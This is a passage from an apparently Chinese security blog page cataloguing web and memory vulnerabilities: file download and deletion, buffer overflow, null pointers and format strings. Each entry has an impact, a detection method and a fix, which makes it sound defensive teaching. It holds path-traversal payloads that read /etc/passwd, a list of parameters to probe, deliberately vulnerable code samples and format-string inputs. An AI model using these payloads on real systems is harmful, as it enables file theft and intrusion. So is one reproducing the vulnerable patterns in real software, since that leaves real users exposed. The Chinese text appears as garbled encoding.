class="line">    header(<span class="string">'Content-Type: imgage/jpeg'</span>);</span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);</span><br><span class="line">    header(<span class="string">'Content-Lengh: '</span>.filesize($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹    Payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vul.php?file=/etc/passwd</span><br><span class="line">vul.php?file=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">../æ¢æµ‹ï¼šdownload.php?filename=aa/../xxx.doc ../../../../etc/passwd</span><br><span class="line">download.php?f=ï¬le:///etc/passwd</span><br><span class="line">download.php?f=../ download.php</span><br><span class="line">æ£€æµ‹ä»¥ä¸‹urlå‚æ•°ï¼š</span><br><span class="line">&amp;RealPath=</span><br><span class="line">&amp;FilePath=</span><br><span class="line">&amp;filepath=</span><br><span class="line">&amp;Path=</span><br><span class="line">&amp;path=</span><br><span class="line">&amp;inputFile=</span><br><span class="line">&amp;url=</span><br><span class="line">&amp;Lang=</span><br><span class="line">&amp;dis=</span><br><span class="line">&amp;data=</span><br><span class="line">&amp;readfile=</span><br><span class="line">&amp;src</span><br></pre></td></tr></table></figure><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>å¯¹ä¸‹è½½è·¯å¾„è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚ä¸‹è½½å‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¹¶ä¸”å¯¹ä¸‹è½½æ–‡ä»¶ç±»å‹è¿›è¡Œæ£€æŸ¥ï¼Œæ˜¯å¦æ˜¯å…è®¸ä¸‹è½½çš„ç±»å‹ï¼Œå¦å¤–ç¦æ­¢ä½¿ç”¨å›æº¯ç¬¦<code>../</code> ï¼› </p></li><li><p>æ­£åˆ™ä¸¥æ ¼åˆ¤æ–­ç”¨æˆ·è¾“å…¥å‚æ•°çš„æ ¼å¼ï¼›</p></li><li><p><code>php.ini</code>é…ç½®<code>open_basedir</code>é™å®šæ–‡ä»¶è®¿é—®èŒƒå›´</p></li></ul><h3 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>æœªç»æˆæƒè®¿é—®è€…å¯ä»¥è¿›è¡Œåˆ é™¤æ–‡ä»¶ã€é™„ä»¶ã€å›¾ç‰‡ã€æ›¿æ¢ã€é…ç½®ç­‰ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li>æ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´å¯ç›´æ¥åˆ é™¤Webç›®å½•ç”šè‡³æœåŠ¡å™¨ä¸Šä»»æ„æ ¼å¼æ–‡ä»¶ï¼Œç›´æ¥å¯¼è‡´ä¸šåŠ¡ç³»ç»Ÿä¸­æ–­ã€å´©æºƒã€‚</li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šå­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤çš„ä»£ç ç¤ºä¾‹ï¼šæ„é€ æœåŠ¡å™¨ä¸Šå·²æœ‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹<code>payload</code>ï¼Œå³å¯åˆ é™¤ç›®æ ‡æœåŠ¡å™¨çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">del</span><span class="params">()</span></span>&#123;</span><br><span class="line">                   $dir = $<span class="keyword">this</span>-&gt;input-&gt;get_post(<span class="string">'id'</span>,<span class="keyword">true</span>);</span><br><span class="line">                   <span class="keyword">if</span>(empty($dir))&#123;</span><br><span class="line">                            getjson(L(<span class="string">'plub_11'</span>));</span><br><span class="line">                   &#125;</span><br><span class="line">                   $dirs = array();</span><br><span class="line">                   <span class="keyword">if</span>(!is_array($dir))&#123;</span><br><span class="line">                            $dirs[] = $dir;</span><br><span class="line">                   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            $dirs = $dir;</span><br><span class="line">                   &#125;</span><br><span class="line">                   foreach($dirs as $dir) &#123;</span><br><span class="line">            deldir(FCPATH.<span class="string">'attachment/backup/'</span>.$dir);</span><br><span class="line">                   &#125;</span><br><span class="line">                   $info[<span class="string">'msg'</span>] = L(<span class="string">'plub_12'</span>);</span><br><span class="line">                   $info[<span class="string">'url'</span>] = site_url(<span class="string">'basedb/restore'</span>).<span class="string">'?v='</span>.rand(<span class="number">1000</span>,<span class="number">9999</span>);</span><br><span class="line">        getjson($info,<span class="number">0</span>);</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li>åˆ¤æ–­ä»£ç é‡Œæ˜¯å¦æœ‰è¿›è¡Œåˆ é™¤æ“ä½œçš„å‡½æ•°ï¼Œå¯¹æäº¤çš„å‚æ•°è¿›è¡Œç®€å•çš„åˆ¤æ–­ï¼Œç„¶ååœ¨è¾“å…¥çš„å‚æ•°æ‹¼æ¥æœåŠ¡å™¨ä¸Šå·²æœ‰æµ‹è¯•æ–‡ä»¶çš„ç›®å½•ï¼Œåˆ é™¤æˆåŠŸåˆ™è¡¨ç¤ºç›®æ ‡å­˜åœ¨ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ã€‚</li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>é™åˆ¶æ–‡ä»¶åˆ é™¤å‡½æ•°å¯åˆ é™¤çš„ç›®å½•ä½ç½®ä»¥åŠæ–‡ä»¶ç±»å‹</p></li><li><p>æ–‡ä»¶åéç”¨æˆ·å¯æ§</p></li><li><p>ç¦æ­¢ä½¿ç”¨å›æº¯ç¬¦<code>../</code> </p></li></ul><h3 id="ç¼“å†²åŒºæº¢å‡º"><a href="#ç¼“å†²åŒºæº¢å‡º" class="headerlink" title="ç¼“å†²åŒºæº¢å‡º"></a>ç¼“å†²åŒºæº¢å‡º</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>ç¼“å†²åŒºæº¢å‡ºé”™è¯¯çš„ç‰¹å¾æ˜¯è¦†ç›–äº†è¿›ç¨‹çš„å†…å­˜ç‰‡æ®µï¼Œè¿™äº›å†…å­˜ç‰‡æ®µæ°¸è¿œä¸è¦æœ‰æ„æˆ–æ— æ„åœ°ä¿®æ”¹ã€‚IPï¼ˆæŒ‡ä»¤æŒ‡é’ˆï¼‰ï¼ŒBPï¼ˆåŸºæœ¬æŒ‡é’ˆï¼‰å’Œå…¶ä»–å¯„å­˜å™¨çš„å€¼è¦†ç›–ä¼šå¯¼è‡´å¼‚å¸¸ï¼Œåˆ†æ®µé”™è¯¯å’Œå…¶ä»–é”™è¯¯å‘ç”Ÿã€‚é€šå¸¸ï¼Œè¿™äº›é”™è¯¯ä¼šä»¥æ„å¤–çš„æ–¹å¼ç»ˆæ­¢åº”ç”¨ç¨‹åºçš„æ‰§è¡Œã€‚å½“æˆ‘ä»¬å¯¹charç±»å‹çš„ç¼“å†²åŒºè¿›è¡Œæ“ä½œæ—¶ï¼Œä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºé”™è¯¯ã€‚ç¼“å†²åŒºæº¢å‡ºå¯ä»¥åŒ…æ‹¬æº¢å‡ºå †æ ˆï¼ˆå †æ ˆæº¢å‡ºï¼‰æˆ–æº¢å‡ºå †ï¼ˆå †æº¢å‡ºï¼‰ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>ç¼“å†²åŒºæº¢å‡ºé€šå¸¸ä¼šå¯¼è‡´å´©æºƒã€‚å¯¼è‡´ç¼ºä¹å¯ç”¨æ€§çš„å…¶ä»–æ”»å‡»ä¹Ÿæ˜¯å¯èƒ½çš„ï¼ŒåŒ…æ‹¬å°†ç¨‹åºç½®äºæ— é™å¾ªç¯ä¸­ã€‚</p></li><li><p>ç¼“å†²åŒºæº¢å‡ºå¯ç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œè¿™é€šå¸¸è¶…å‡ºç¨‹åºéšå¼å®‰å…¨ç­–ç•¥çš„èŒƒå›´ã€‚</p></li><li><p>å½“åæœæ˜¯æ‰§è¡Œä»»æ„ä»£ç æ—¶ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨å®ƒæ¥é¢ è¦†ä»»ä½•å…¶ä»–å®‰å…¨æœåŠ¡ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><ul><li>åœºæ™¯1ï¼šç¼“å†²åŒºå¤§å°æ˜¯å›ºå®šçš„ï¼Œä½†ä¸èƒ½ä¿è¯<code>argv [1]</code>ä¸­çš„å­—ç¬¦ä¸²ä¸ä¼šè¶…è¿‡è¯¥å¤§å°å¹¶å¼•èµ·æº¢å‡ºã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 256</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line"><span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>åœ¨æ£€æŸ¥ä»£ç ä¸­æ˜¯å¦å­˜åœ¨å †æ ˆæº¢å‡ºæ—¶ï¼Œå»ºè®®æœç´¢å¯¹ä¸å®‰å…¨çš„åº“å‡½æ•°ï¼ˆå¦‚<code>gets()</code>ï¼Œ<code>strcpy()</code>ï¼Œ<code>strcat()</code>ç­‰ï¼‰çš„è°ƒç”¨ï¼Œè¿™äº›å‡½æ•°ä¸ä¼šéªŒè¯æºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¹¶ç›²ç›®åœ°å°†æ•°æ®å¤åˆ¶åˆ°å›ºå®šå¤§å°çš„ç¼“å†²åŒºä¸­ã€‚</p></li><li><p>å½“å°†å¯å˜å¤§å°çš„æ•°æ®å¤åˆ¶åˆ°ä½äºç¨‹åºå †æ ˆä¸Šçš„å›ºå®šé•¿åº¦ç¼“å†²åŒºè€Œä¸è¿›è¡Œä»»ä½•è¾¹ç•Œæ£€æŸ¥æ—¶ï¼Œå°±ä¼šå‘ç”Ÿå †æ ˆæº¢å‡ºã€‚</p></li></ul><p><code>OWASP</code>æ£€æµ‹æ–¹æ¡ˆï¼š</p><ul><li><p><a href="https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.2-Testing_for_Stack_Overflow.html" target="_blank" rel="noopener">https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.2-Testing_for_Stack_Overflow.html</a></p></li><li><p><a href="https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.1-Testing_for_Heap_Overflow.html" target="_blank" rel="noopener">https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13.1-Testing_for_Heap_Overflow.html</a></p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li>ä¸ä½¿ç”¨<code>strcpy()</code>ã€<code>sprintf()</code>ç­‰ä¸å®‰å…¨çš„å‡½æ•°ï¼Œè€Œè¦åœ¨<code>strncpy()</code>ã€<code>memcpy()</code>ã€<code>snprinf()</code>çš„åŸºç¡€ä¸Šå°è£…å‡ºå®‰å…¨çš„å‡½æ•°ï¼Œå¯¹<code>copy</code>è¿›<code>buffer</code>çš„å†…å®¹å¤§å°è¿›è¡Œé™åˆ¶ï¼Œè¶…è¿‡å¤§å°åˆ™æˆªæ–­ã€‚</li></ul><h3 id="ç©ºæŒ‡é’ˆæ¼æ´"><a href="#ç©ºæŒ‡é’ˆæ¼æ´" class="headerlink" title="ç©ºæŒ‡é’ˆæ¼æ´"></a>ç©ºæŒ‡é’ˆæ¼æ´</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><code>Null Pointer</code>ç©ºæŒ‡é’ˆçš„å¼•ç”¨ï¼Œå¯¹äºç©ºæŒ‡é’ˆçš„é”™è¯¯å¼•ç”¨å¾€å¾€æ˜¯ç”±äºåœ¨å¼•ç”¨ä¹‹å‰æ²¡æœ‰å¯¹ç©ºæŒ‡é’ˆåšåˆ¤æ–­ï¼Œå°±ç›´æ¥ä½¿ç”¨ç©ºæŒ‡é’ˆï¼Œè¿˜æœ‰å¯èƒ½æŠŠç©ºæŒ‡é’ˆä½œä¸ºä¸€ä¸ªå¯¹è±¡æ¥ä½¿ç”¨ï¼Œé—´æ¥ä½¿ç”¨å¯¹è±¡ä¸­çš„å±æ€§æˆ–æ˜¯æ–¹æ³•ï¼Œè€Œå¼•èµ·ç¨‹åºå´©æºƒï¼Œç©ºæŒ‡é’ˆçš„é”™è¯¯ä½¿ç”¨å¸¸è§äºç³»ç»Ÿã€æœåŠ¡ã€è½¯ä»¶æ¼æ´æ–¹é¢ã€‚å½“åº”ç”¨ç¨‹åºå–æ¶ˆå¼•ç”¨å®ƒæœŸæœ›æ˜¯æœ‰æ•ˆçš„ä½†ä¸º<code>NULL</code>çš„æŒ‡é’ˆæ—¶ï¼Œå°±ä¼šå‘ç”ŸNULLæŒ‡é’ˆå–æ¶ˆå¼•ç”¨ï¼Œé€šå¸¸ä¼šå¯¼è‡´å´©æºƒæˆ–é€€å‡ºã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>é€ æˆç¨‹åºçš„å´©æºƒï¼Œé€€å‡ºæˆ–é‡æ–°å¯åŠ¨ã€‚</p></li><li><p>æ‰§è¡Œæœªç»æˆæƒçš„ä»£ç æˆ–å‘½ä»¤ï¼›è¯»å–å†…å­˜ï¼›ä¿®æ”¹å†…å­˜ã€‚</p></li><li><p>åœ¨æå°‘æ•°æƒ…å†µä¸‹ï¼Œå½“NULLç­‰äº0x0å†…å­˜åœ°å€å¹¶ä¸”ç‰¹æƒä»£ç å¯ä»¥è®¿é—®å®ƒæ—¶ï¼Œå°±å¯ä»¥å†™å…¥æˆ–è¯»å–å†…å­˜ï¼Œè¿™å¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šä»¥ä¸‹æ­¥éª¤å°†ç¡®ä¿ç¨‹åºä¸å‘ç”Ÿç©ºæŒ‡é’ˆå–æ¶ˆå¼•ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pointer1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">/* make use of pointer1 */</span></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœºæ™¯2ï¼šåœ¨ä»¥ä¸‹ä»£ç ä¸­ï¼Œç¨‹åºå‘˜å‡å®šç³»ç»Ÿå§‹ç»ˆå®šä¹‰äº†åä¸ºâ€œ<code>cmd</code>â€çš„å±æ€§ã€‚å¦‚æœæ”»å‡»è€…å¯ä»¥æ§åˆ¶ç¨‹åºçš„ç¯å¢ƒï¼Œä»è€Œæœªå®šä¹‰â€œ<code>cmd</code>â€ï¼Œåˆ™å½“ç¨‹åºå°è¯•è°ƒç”¨<code>trim()</code>æ–¹æ³•æ—¶ï¼Œè¯¥ç¨‹åºå°†å¼•å‘NULLæŒ‡é’ˆå¼‚å¸¸ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Example Language: Java </span></span><br><span class="line"></span><br><span class="line">String cmd = System.getProperty(<span class="string">"cmd"</span>);</span><br><span class="line">cmd = cmd.trim();</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>è‡ªåŠ¨åŒ–åŠ¨æ€åˆ†æï¼šå¯ä»¥ä½¿ç”¨åŠ¨æ€å·¥å…·å’ŒæŠ€æœ¯æ¥æ£€æµ‹åˆ°æ­¤å¼±ç‚¹ï¼Œè¿™äº›å·¥å…·å’ŒæŠ€æœ¯å¯ä»¥ä½¿ç”¨å…·æœ‰å¤§é‡ä¸åŒè¾“å…¥çš„å¤§å‹æµ‹è¯•å¥—ä»¶ä¸è½¯ä»¶è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚æ¨¡ç³Šæµ‹è¯•ï¼ˆ<code>fuzzing</code>ï¼‰ï¼Œç¨³å®šæ€§æµ‹è¯•å’Œæ•…éšœæ³¨å…¥ã€‚è¯¥åº”ç”¨ç¨‹åºçš„æ“ä½œå¯èƒ½ä¼šå˜æ…¢ï¼Œä½†ä¸åº”å˜å¾—ä¸ç¨³å®šï¼Œå´©æºƒæˆ–äº§ç”Ÿé”™è¯¯çš„ç»“æœã€‚</p></li><li><p>æ‰‹åŠ¨åŠ¨æ€åˆ†æï¼šç¡®å®šæ­£å¸¸ä½¿ç”¨æœŸé—´ä¸å¤ªå¯èƒ½å‘ç”Ÿçš„é”™è¯¯æƒ…å†µå¹¶è§¦å‘å®ƒä»¬ã€‚ä¾‹å¦‚ï¼Œåœ¨å†…å­˜ä¸è¶³çš„æƒ…å†µä¸‹è¿è¡Œè¯¥ç¨‹åºï¼Œæ²¡æœ‰è¶³å¤Ÿçš„ç‰¹æƒæˆ–æƒé™è¿è¡Œè¯¥ç¨‹åºï¼Œåœ¨è¿›ç¨‹å®Œæˆä¹‹å‰ä¸­æ–­è¯¥è¿›ç¨‹ï¼Œæˆ–ç¦ç”¨ä¸åŸºæœ¬ç½‘ç»œæœåŠ¡ï¼ˆä¾‹å¦‚<code>DNS</code>ï¼‰çš„è¿æ¥ï¼Œç›‘æ§åº”ç”¨ç¨‹åºæ˜¯å¦æœ‰æ„å¤–é”™è¯¯è¡Œä¸ºã€‚å¦‚æœæ‚¨è§¦å‘äº†æœªå¤„ç†çš„å¼‚å¸¸æˆ–ç”±åº”ç”¨ç¨‹åºçš„ç¯å¢ƒå‘ç°å¹¶å¤„ç†çš„ç±»ä¼¼é”™è¯¯ï¼Œåˆ™å®ƒå¯èƒ½ä»æŒ‡ç¤ºåº”ç”¨ç¨‹åºæœ¬èº«æœªå¤„ç†çš„æ„å¤–æƒ…å†µã€‚</p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>å¦‚æœåœ¨ä½¿ç”¨ä¹‹å‰å¯¹æ‰€æœ‰å¯èƒ½å·²ä¿®æ”¹çš„æŒ‡é’ˆè¿›è¡Œäº†å®Œæ•´æ€§æ£€æŸ¥ï¼Œåˆ™å¯ä»¥é˜²æ­¢å‡ ä¹æ‰€æœ‰çš„<code>NULL</code>æŒ‡é’ˆå–æ¶ˆå¼•ç”¨ã€‚</p></li><li><p>åœ¨è¿”å›å€¼ä¹‹å‰ï¼Œè¯·æ£€æŸ¥æ‰€æœ‰è¿”å›å€¼çš„å‡½æ•°çš„ç»“æœï¼Œå¹¶éªŒè¯è¯¥å€¼æ˜¯å¦ä¸ºéç©ºå€¼ã€‚</p></li><li><p>è¯†åˆ«æ‰€æœ‰ä»å¤–éƒ¨æ¥æºæ¥æ”¶ä¿¡æ¯çš„å˜é‡å’Œæ•°æ®å­˜å‚¨ï¼Œå¹¶åº”ç”¨è¾“å…¥éªŒè¯ä»¥ç¡®ä¿å®ƒä»¬ä»…è¢«åˆå§‹åŒ–ä¸ºæœŸæœ›å€¼ã€‚</p></li><li><p>åœ¨å£°æ˜è¿‡ç¨‹ä¸­æˆ–åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæ˜¾å¼åˆå§‹åŒ–æ‰€æœ‰å˜é‡å’Œå…¶ä»–æ•°æ®å­˜å‚¨ã€‚</p></li></ul><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h3><p><strong>æ¼æ´æè¿°</strong></p><p>å½“åº”ç”¨ç¨‹åºå°†è¾“å…¥å­—ç¬¦ä¸²çš„æäº¤æ•°æ®ä½œä¸ºå‘½ä»¤è¯„ä¼°æ—¶ï¼Œå°±ä¼šå‘ç”ŸFormat Stringæ”»å‡»ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»£ç ï¼Œè¯»å–å †æ ˆæˆ–åœ¨æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­å¼•èµ·åˆ†æ®µé”™è¯¯ï¼Œä»è€Œå¯¼è‡´å¯èƒ½æŸå®³ç³»ç»Ÿå®‰å…¨æ€§æˆ–ç¨³å®šæ€§çš„æ–°è¡Œä¸ºã€‚</p><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>å¦‚æœæœåŠ¡å™¨ç«¯ä»£ç å°†ç”¨æˆ·è¾“å…¥ä¸æ ¼å¼å­—ç¬¦ä¸²è¿æ¥åœ¨ä¸€èµ·ï¼Œåˆ™æ”»å‡»è€…å¯èƒ½ä¼šé™„åŠ å…¶ä»–è½¬æ¢è¯´æ˜ç¬¦ï¼Œä»è€Œå¯¼è‡´è¿è¡Œæ—¶é”™è¯¯ï¼Œä¿¡æ¯æ³„éœ²æˆ–ç¼“å†²åŒºæº¢å‡ºã€‚</p></li><li><p>å¦‚æœæ”»å‡»è€…é€šè¿‡ä¿®æ”¹æ ¼å¼å­—ç¬¦ä¸²æ¥åˆ©ç”¨è¿™äº›åŠŸèƒ½ï¼Œåˆ™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²å’Œä»£ç æ‰§è¡Œã€‚</p></li><li><p>æ”»å‡»æˆåŠŸå¯èƒ½é€ æˆä¿®æ”¹æ•°æ®ã€è¯»å–æ•°æ®ã€è·å¾—æƒé™ã€è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ </p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1: å¯¼è‡´æ ¼å¼å­—ç¬¦ä¸²æ¼æ´çš„ä»£ç æ¨¡å¼æ˜¯å¯¹åŒ…å«æœªç»å¤„ç†çš„ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²æ ¼å¼å‡½æ•°çš„è°ƒç”¨ã€‚ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºäº†è°ƒè¯•å¦‚ä½•printfä½¿ç¨‹åºæ˜“å—æ”»å‡»ï¼š</p><ul><li><code>C</code>ä¸­çš„ç¤ºä¾‹ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *userName = <span class="comment">/* input from user controlled field */</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"DEBUG Current user: "</span>);</span><br><span class="line"><span class="comment">//å­˜åœ¨æ¼æ´çš„è°ƒè¯•ä»£ç </span></span><br><span class="line"><span class="built_in">printf</span>(userName);</span><br></pre></td></tr></table></figure><ul><li><code>Java</code>ä¸­çš„ç¤ºä¾‹ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> String userName = <span class="comment">/* input from user controlled field */</span>;</span><br><span class="line"></span><br><span class="line">System.out.printf(<span class="string">"DEBUG Current user: "</span>);</span><br><span class="line"><span class="comment">// å­˜åœ¨æ¼æ´çš„ä»£ç :</span></span><br><span class="line">System.out.printf(userName);</span><br></pre></td></tr></table></figure><ul><li>åœ¨æ­¤ç‰¹å®šç¤ºä¾‹ä¸­ï¼Œå¦‚æœæ”»å‡»è€…å°†å…¶è®¾ç½®<code>userName</code>ä¸ºå…·æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªè½¬æ¢è¯´æ˜ç¬¦ï¼Œåˆ™å°†å‡ºç°æœ‰å®³çš„è¡Œä¸ºã€‚<code>C</code>ç¤ºä¾‹å°†æ‰“å°å‡ºå†…å­˜å†…å®¹ï¼ˆå¦‚æœ<code>userName</code>åŒ…å«ï¼‰<code>%p%p%p%p%p</code>ï¼Œå¹¶ä¸”å¦‚æœ<code>%n</code>å­—ç¬¦ä¸²ä¸­æœ‰<code>a</code>ï¼Œå®ƒå¯èƒ½ä¼šç ´åå†…å­˜å†…å®¹ã€‚åœ¨<code>Java</code>ç¤ºä¾‹ä¸­ï¼Œ<code>username</code>åŒ…å«ä»»ä½•éœ€è¦è¾“å…¥ï¼ˆåŒ…æ‹¬%xæˆ–%sï¼‰çš„è¯´æ˜ç¬¦çš„éƒ½ä¼šå¯¼è‡´å¯¼è‡´ç¨‹åºå´©æºƒ<code>IllegalFormatException</code>ã€‚å°½ç®¡ç¤ºä¾‹ä»ç„¶å­˜åœ¨å…¶ä»–é—®é¢˜ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä½¿ç”¨<code>printf</code>å‚æ•°ä¿®å¤è¯¥æ¼æ´<code>printf(&quot;DEBUG Current user: %s&quot;, userName)</code>ã€‚</li></ul><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>å­˜åœ¨æ¼æ´çš„å…ˆå†³æ¡ä»¶ï¼šç›®æ ‡åº”ç”¨ç¨‹åºå¿…é¡»æ¥å—å­—ç¬¦ä¸²ä½œä¸ºç”¨æˆ·è¾“å…¥ï¼Œæ— æ³•æ¸…ç†ç”¨æˆ·è¾“å…¥ä¸­çš„å­—ç¬¦ä¸²æ ¼å¼å­—ç¬¦ï¼Œå¹¶ä½¿ç”¨è§£é‡Šå­—ç¬¦ä¸²æ ¼å¼å­—ç¬¦çš„å‡½æ•°æ¥å¤„ç†æ­¤å­—ç¬¦ä¸²ã€‚</p></li><li><p>é™æ€åˆ†æå·¥å…·å¯ä»¥åœ¨ä»£ç æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ã€‚å·¥å…·ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><p><code>C</code>å’Œ<code>C ++</code>ï¼š<code>Flawfinder</code></p><p><code>Java</code>ï¼š<code>FindSecurityBugs</code>è§„åˆ™<code>FORMAT_STRING_MANIPULATION</code></p><p><code>PHP</code>ï¼š<code>phpsa</code>ä¸­çš„å­—ç¬¦ä¸²æ ¼å¼åˆ†æå™¨</p></li><li><p>æ‰‹åŠ¨ä»£ç æ£€æŸ¥ï¼šé™æ€åˆ†æå¯èƒ½ä¼šé”™è¿‡æ›´å¤æ‚çš„æƒ…å†µï¼ŒåŒ…æ‹¬å¤æ‚ä»£ç ç”Ÿæˆçš„æ ¼å¼å­—ç¬¦ä¸²ã€‚è¦åœ¨ä»£ç åº“ä¸­æ‰‹åŠ¨æŸ¥æ‰¾æ¼æ´ï¼Œæµ‹è¯•äººå‘˜å¯ä»¥åœ¨ä»£ç åº“ä¸­æŸ¥æ‰¾æ‰€æœ‰æ¥å—æ ¼å¼å­—ç¬¦ä¸²çš„è°ƒç”¨ï¼Œç„¶åå›æº¯ä»¥ç¡®ä¿ä¸å—ä¿¡ä»»çš„è¾“å…¥æ— æ³•æ›´æ”¹æ ¼å¼å­—ç¬¦ä¸²ã€‚</p></li><li><p>æ‰‹åŠ¨æ³¨å…¥ï¼šæµ‹è¯•äººå‘˜å¯ä»¥ä½¿ç”¨Webæµè§ˆå™¨æˆ–å…¶ä»–Web 